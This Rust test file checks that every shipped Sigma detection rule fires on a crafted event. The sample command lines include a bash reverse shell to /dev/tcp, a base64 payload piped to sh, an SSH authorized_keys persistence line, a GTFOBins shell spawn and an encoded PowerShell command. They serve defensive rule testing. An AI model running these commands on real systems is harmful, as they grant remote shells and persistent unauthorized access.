//! Content regression suite: loads the real detection content from `rules/sigma/`
//! and asserts that every shipped rule (a) parses and validates inside the engine's
//! supported subset, and (b) fires on a crafted matching event. Run by CI's content
//! workflow on every rules/ change — a rule nothing can trigger is dead content and
//! fails here.

use schema::{EventMeta, ExecEvent};
use sigma::SigmaEngine;

fn content_dir() -> std::path::PathBuf {
    std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/sigma")
}

fn exec(image: &str, cmdline: &str) -> ExecEvent {
    ExecEvent {
        meta: EventMeta {
            pid: 1,
            comm: "test".into(),
            ..schema::fixtures::meta()
        },
        image_path: image.to_string(),
        cmdline: cmdline.to_string(),
        ..schema::fixtures::exec()
    }
}

/// One crafted matching sample per shipped rule, keyed by the rule title.
/// Adding a rule to rules/sigma/ means adding its sample here.
fn matching_samples() -> Vec<(&'static str, ExecEvent)> {
    vec![
        (
            "Base64-encoded command piped to a shell",
            exec("/bin/bash", "bash -c echo cGF5bG9hZAo= | base64 -d | sh"),
        ),
        (
            "GTFOBins - system binary used to spawn a shell",
            exec("/usr/bin/find", "find . -exec /bin/sh ;"),
        ),
        (
            "Persistence via cron, SSH authorized_keys or systemd service",
            exec(
                "/bin/bash",
                "bash -c echo ssh-rsa AAAA... >> ~/.ssh/authorized_keys",
            ),
        ),
        (
            "Reverse shell via /dev/tcp or nc/ncat with execution",
            exec("/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
        ),
        (
            "Executable launched from a temporary or world-writable directory",
            exec("/tmp/payload", "/tmp/payload"),
        ),
        (
            "Rundll32 with suspicious argument",
            exec(
                "C:\\Windows\\System32\\rundll32.exe",
                "rundll32.exe javascript:alert()",
            ),
        ),
        (
            "PowerShell Base64-encoded command",
            exec(
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "powershell.exe -EncodedCommand JABzAD0A",
            ),
        ),
        (
            "Executable from AppData or Temp",
            exec("C:\\Users\\u\\AppData\\Roaming\\evil.exe", "evil.exe"),
        ),
    ]
}

#[test]
fn every_shipped_rule_loads() {
    let dir = content_dir();
    let files: Vec<_> = walk_yaml(&dir);
    assert!(
        !files.is_empty(),
        "no rule files found under {}",
        dir.display()
    );
    // load_dir skips invalid rules with a warning — for content CI we want hard
    // failure instead, so load each file individually.
    for f in &files {
        SigmaEngine::load_rule(f).unwrap_or_else(|e| panic!("shipped rule failed to load: {e}"));
    }
    let engine = SigmaEngine::load_dir(&dir).unwrap();
    assert_eq!(
        engine.rule_count(),
        files.len(),
        "engine must load every shipped rule"
    );
}

#[test]
fn every_shipped_rule_fires_on_its_sample() {
    let engine = SigmaEngine::load_dir(&content_dir()).unwrap();
    let samples = matching_samples();
    assert_eq!(
        samples.len(),
        engine.rule_count(),
        "one matching sample per shipped rule — add the sample for the new rule"
    );
    for (title, event) in &samples {
        let hits = engine.eval_exec(event);
        assert!(
            hits.iter().any(|a| a.title == *title),
            "rule `{title}` did not fire on its crafted sample (hits: {:?})",
            hits.iter().map(|a| &a.title).collect::<Vec<_>>()
        );
    }
}

fn walk_yaml(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut out = Vec::new();
    let mut stack = vec![dir.to_path_buf()];
    while let Some(d) = stack.pop() {
        for entry in std::fs::read_dir(&d).unwrap().flatten() {
            let p = entry.path();
            if p.is_dir() {
                stack.push(p);
            } else if p.extension().is_some_and(|e| e == "yml" || e == "yaml") {
                out.push(p);
            }
        }
    }
    out
}
